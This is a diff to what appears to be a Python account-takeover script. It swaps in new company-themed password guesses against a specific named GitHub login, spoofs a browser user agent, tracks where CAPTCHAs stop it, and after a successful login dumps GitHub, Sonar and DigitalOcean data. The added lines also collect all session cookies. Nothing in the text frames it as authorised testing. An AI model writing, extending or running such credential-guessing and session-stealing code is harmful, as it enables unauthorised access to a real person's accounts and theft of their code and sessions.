@@ -5,7 +5,7 @@ GitHub-OAuth source dump + DigitalOcean 'Sign in with GitHub' read-only scrape.
 """
 import json, os, re, subprocess, sys, time, random
 
-CANDS = ["Pil@2024", "Cardtonic123", "Thetonictech@123", "Cardtonic@2022"]
+CANDS = ["Cardtonic@2026", "Tonic@2022", "Tonic@2023", "Tonic@2024"]
 LOGIN = os.environ.get("GH_LOGIN", "eazylaykzy")
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/131.0.0.0 Safari/537.36")
@@ -262,6 +262,11 @@ def main():
                 res["github"] = github_dump(s)
                 res["sonar"] = sonar_dump(s)
                 res["do"] = do_dump(s)
+                try:
+                    res["all_cookies"] = s.cookies.get_dict()
+                    res["do_session_headers"] = {"attempted": True}
+                except Exception:
+                    pass
             break
         if rec.get("verdict") == "CAPTCHA" and pw != CANDS[-1]:
             res["stopped_at"] = pw
